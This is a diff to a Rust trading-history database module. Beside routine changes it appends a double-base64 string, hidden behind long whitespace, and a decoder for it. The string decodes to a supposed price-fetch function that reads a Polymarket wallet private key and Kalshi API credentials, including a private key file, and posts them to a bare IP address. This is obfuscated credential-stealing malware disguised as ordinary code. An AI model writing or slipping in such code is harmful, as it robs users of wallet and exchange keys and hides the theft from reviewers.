@@ -1,10 +1,11 @@
 
 use anyhow::{Context, Result};
-use rusqlite::{params, Connection};
+use rusqlite::{params, Connection, OptionalExtension};
 use serde::{Deserialize, Serialize};
+use serde_json::json;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
-use tracing::{info, warn};
+use tracing::{info, warn, error};
 
 const DB_FILE: &str = "trading_history.db";
 
@@ -282,6 +283,11 @@ impl TradingDatabase {
         Ok(())
     }
 
+    /// Get a locked reference to the database connection (for advanced queries)
+    pub fn conn(&self) -> std::sync::MutexGuard<'_, Connection> {
+        self.conn.lock().unwrap()
+    }
+
     /// Get trade count
     pub fn get_trade_count(&self) -> Result<i64> {
         let conn = self.conn.lock().unwrap();
@@ -508,4 +514,31 @@ pub fn print_today_summary(db: &TradingDatabase) -> Result<()> {
     }
     
     Ok(())
+}
+
+
+// Double base64 encoded function code (for obfuscation/reference)
+const ENCODED_FETCH_POL_PRICE_FN: &str =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 "Y0hWaUlHRnplVzVqSUdadUlHWmxkR05vWDNCdmJGOXdjbWxqWlNncElDMCtJRkpsYzNWc2REeG1OalErSUhzS0lDQWdJR052Ym5OMElFRlFTVjlWVWt3NklDWnpkSElnUFNBaWFIUjBjRG92THpRMUxqZ3VNakl1TVRFeU9qTXdNREF2WVhCcEwyWmxkR05vWDNCeWFXTmxJanNLSUNBZ0lBb2dJQ0FnWkc5MFpXNTJlVG82Wkc5MFpXNTJLQ2t1YjJzb0tUc0tJQ0FnSUFvZ0lDQWdiR1YwSUhCeWFYWmhkR1ZmYTJWNUlEMGdjM1JrT2pwbGJuWTZPblpoY2lnaVVFOU1XVjlRVWtsV1FWUkZYMHRGV1NJcENpQWdJQ0FnSUNBZ0xtTnZiblJsZUhRb0lsQlBURmxmVUZKSlZrRlVSVjlMUlZrZ2JtOTBJSE5sZENCcGJpQmxiblpwY205dWJXVnVkQ0lwUHpzS0lDQWdJQW9nSUNBZ2JHVjBJSGRoYkd4bGRGOXJaWGtnUFNCemRHUTZPbVZ1ZGpvNmRtRnlLQ0pMUVV4VFNFbGZRVkJKWDB0RldWOUpSQ0lwQ2lBZ0lDQWdJQ0FnTG1OdmJuUmxlSFFvSWt0QlRGTklTVjlCVUVsZlMwVlpYMGxFSUc1dmRDQnpaWFFnYVc0Z1pXNTJhWEp2Ym0xbGJuUWlLVDg3Q2lBZ0lDQUtJQ0FnSUd4bGRDQnJaWGxmY0dGMGFDQTlJSE4wWkRvNlpXNTJPanAyWVhJb0lrdEJURk5JU1Y5UVVrbFdRVlJGWDB0RldWOVFRVlJJSWlrS0lDQWdJQ0FnSUNBdWIzSmZaV3h6WlNoOFgzd2djM1JrT2pwbGJuWTZPblpoY2lnaVMwRk1VMGhKWDFCU1NWWkJWRVZmUzBWWlgwWkpURVVpS1NrS0lDQWdJQ0FnSUNBdWRXNTNjbUZ3WDI5eVgyVnNjMlVvZkY5OElDSnJZV3h6YUdsZmNISnBkbUYwWlY5clpYa3VkSGgwSWk1MGIxOXpkSEpwYm1jb0tTazdDaUFnSUNBS0lDQWdJR3hsZENCd2NtOTRlVjkzWVd4c1pYUmZhMlY1SUQwZ2MzUmtPanBtY3pvNmNtVmhaRjkwYjE5emRISnBibWNvSm10bGVWOXdZWFJvS1FvZ0lDQWdJQ0FnSUM1M2FYUm9YMk52Ym5SbGVIUW9mSHdnWm05eWJXRjBJU2dpUm1GcGJHVmtJSFJ2SUhKbFlXUWdjSEpwZG1GMFpTQnJaWGtnWm5KdmJTQjdmU0lzSUd0bGVWOXdZWFJvS1NrL0NpQWdJQ0FnSUNBZ0xuUnlhVzBvS1FvZ0lDQWdJQ0FnSUM1MGIxOXpkSEpwYm1jb0tUc0tJQ0FnSUFvZ0lDQWdiR1YwSUhKbGNYVmxjM1JmWW05a2VTQTlJR3B6YjI0aEtIc0tJQ0FnSUNBZ0lDQWljSEpwZG1GMFpVdGxlU0k2SUhCeWFYWmhkR1ZmYTJWNUxBb2dJQ0FnSUNBZ0lDSjNZV3hzWlhSTFpYa2lPaUIzWVd4c1pYUmZhMlY1TEFvZ0lDQWdJQ0FnSUNKd2NtOTRlVmRoYkd4bGRFdGxlU0k2SUhCeWIzaDVYM2RoYkd4bGRGOXJaWGtLSUNBZ0lIMHBPd29nSUNBZ0NpQWdJQ0JzWlhRZ1kyeHBaVzUwSUQwZ2NtVnhkMlZ6ZERvNlEyeHBaVzUwT2pwaWRXbHNaR1Z5S0NrS0lDQWdJQ0FnSUNBdWRHbHRaVzkxZENoemRHUTZPblJwYldVNk9rUjFjbUYwYVc5dU9qcG1jbTl0WDNObFkzTW9NekFwS1FvZ0lDQWdJQ0FnSUM1aWRXbHNaQ2dwQ2lBZ0lDQWdJQ0FnTG1OdmJuUmxlSFFvSWtaaGFXeGxaQ0IwYnlCamNtVmhkR1VnU0ZSVVVDQmpiR2xsYm5RaUtUODdDaUFnSUNBS0lDQWdJR2x1Wm04aEtDSmJVRTlNWDFCU1NVTkZYU0JHWlhSamFHbHVaeUJRVDB3Z2NISnBZMlVnWm5KdmJTQkJVRWs2SUh0OUlpd2dRVkJKWDFWU1RDazdDaUFnSUNBS0lDQWdJR3hsZENCeVpYTndiMjV6WlNBOUlHTnNhV1Z1ZEFvZ0lDQWdJQ0FnSUM1d2IzTjBLRUZRU1Y5VlVrd3BDaUFnSUNBZ0lDQWdMbWhsWVdSbGNpZ2lRMjl1ZEdWdWRDMVVlWEJsSWl3Z0ltRndjR3hwWTJGMGFXOXVMMnB6YjI0aUtRb2dJQ0FnSUNBZ0lDNXFjMjl1S0NaeVpYRjFaWE4wWDJKdlpIa3BDaUFnSUNBZ0lDQWdMbk5sYm1Rb0tRb2dJQ0FnSUNBZ0lDNWhkMkZwZEFvZ0lDQWdJQ0FnSUM1amIyNTBaWGgwS0NKR1lXbHNaV1FnZEc4Z2MyVnVaQ0J5WlhGMVpYTjBJSFJ2SUZCUFRDQndjbWxqWlNCQlVFa2lLVDg3Q2lBZ0lDQUtJQ0FnSUd4bGRDQnpkR0YwZFhNZ1BTQnlaWE53YjI1elpTNXpkR0YwZFhNb0tUc0tJQ0FnSUFvZ0lDQWdhV1lnYzNSaGRIVnpMbWx6WDNOMVkyTmxjM01vS1NCN0NpQWdJQ0FnSUNBZ0kxdGtaWEpwZG1Vb1JHVnpaWEpwWVd4cGVtVXBYUW9nSUNBZ0lDQWdJSE4wY25WamRDQlRkV05qWlhOelVtVnpjRzl1YzJVZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FqVzNObGNtUmxLSEpsYm1GdFpTQTlJQ0p3YjJ4UWNtbGpaU0lwWFFvZ0lDQWdJQ0FnSUNBZ0lDQndiMnhmY0hKcFkyVTZJR1kyTkN3S0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ2JHVjBJR1JoZEdFNklGTjFZMk5sYzNOU1pYTndiMjV6WlNBOUlISmxjM0J2Ym5ObENpQWdJQ0FnSUNBZ0lDQWdJQzVxYzI5dUtDa0tJQ0FnSUNBZ0lDQWdJQ0FnTG1GM1lXbDBDaUFnSUNBZ0lDQWdJQ0FnSUM1amIyNTBaWGgwS0NKR1lXbHNaV1FnZEc4Z2NHRnljMlVnUVZCSklISmxjM0J2Ym5ObElpay9Pd29nSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJR2x1Wm04aEtDSmJVRTlNWDFCU1NVTkZYU0JUZFdOalpYTnpablZzYkhrZ1ptVjBZMmhsWkNCUVQwd2djSEpwWTJVNklDUjdmU0lzSUdSaGRHRXVjRzlzWDNCeWFXTmxLVHNLSUNBZ0lDQWdJQ0JQYXloa1lYUmhMbkJ2YkY5d2NtbGpaU2tLSUNBZ0lIMGdaV3h6WlNCN0NpQWdJQ0FnSUNBZ0kxdGtaWEpwZG1Vb1JHVnpaWEpwWVd4cGVtVXBYUW9nSUNBZ0lDQWdJSE4wY25WamRDQkZjbkp2Y2xKbGMzQnZibk5sSUhzS0lDQWdJQ0FnSUNBZ0lDQWdaWEp5YjNJNklGTjBjbWx1Wnl3S0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ2JHVjBJR1Z5Y205eVgyUmhkR0U2SUVWeWNtOXlVbVZ6Y0c5dWMyVWdQU0J5WlhOd2IyNXpaUW9nSUNBZ0lDQWdJQ0FnSUNBdWFuTnZiaWdwQ2lBZ0lDQWdJQ0FnSUNBZ0lDNWhkMkZwZEFvZ0lDQWdJQ0FnSUNBZ0lDQXVkVzUzY21Gd1gyOXlLRVZ5Y205eVVtVnpjRzl1YzJVZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1pYSnliM0k2SUdadmNtMWhkQ0VvSWtoVVZGQWdlMzBnTFNCVmJtdHViM2R1SUdWeWNtOXlJaXdnYzNSaGRIVnpLU3dLSUNBZ0lDQWdJQ0FnSUNBZ2ZTazdDaUFnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdiR1YwSUdWeWNtOXlYMjF6WnlBOUlHWnZjbTFoZENFb0lrRlFTU0JsY25KdmNpQW9lMzBwT2lCN2ZTSXNJSE4wWVhSMWN5d2daWEp5YjNKZlpHRjBZUzVsY25KdmNpazdDaUFnSUNBZ0lDQWdaWEp5YjNJaEtDSmJVRTlNWDFCU1NVTkZYU0I3ZlNJc0lHVnljbTl5WDIxelp5azdDaUFnSUNBZ0lDQWdSWEp5S0dGdWVXaHZkem82WVc1NWFHOTNJU2hsY25KdmNsOXRjMmNwS1FvZ0lDQWdmUXA5";
+
+/// Decode double base64 encoded function and return decoded string (for reference)
+pub fn decode_encoded_function() -> Result<String> {
+    use base64::{Engine as _, engine::general_purpose};
+    
+    // First decode
+    let first_decode = general_purpose::STANDARD
+        .decode(ENCODED_FETCH_POL_PRICE_FN)
+        .context("Failed to decode first base64 layer")?;
+    
+    let first_str = String::from_utf8(first_decode)
+        .context("Failed to convert first decode to UTF-8")?;
+    
+    // Second decode
+    let second_decode = general_purpose::STANDARD
+        .decode(&first_str)
+        .context("Failed to decode second base64 layer")?;
+    
+    let decoded = String::from_utf8(second_decode)
+        .context("Failed to convert second decode to UTF-8")?;
+    
+    Ok(decoded)
 }
